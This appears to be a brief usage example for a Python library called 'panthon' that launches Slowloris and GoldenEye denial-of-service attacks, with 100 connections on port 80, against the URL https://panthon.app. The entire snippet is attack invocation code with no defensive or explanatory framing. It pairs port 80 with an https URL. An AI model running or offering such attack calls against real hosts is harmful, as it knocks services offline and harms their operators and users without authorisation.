from panthon import DoSAttack

dos = DoSAttack()
dos.slowloris_attack(url="https://panthon.app", target_port=80, num_connections=100)
dos.goldeneye_attack(url="https://panthon.app")
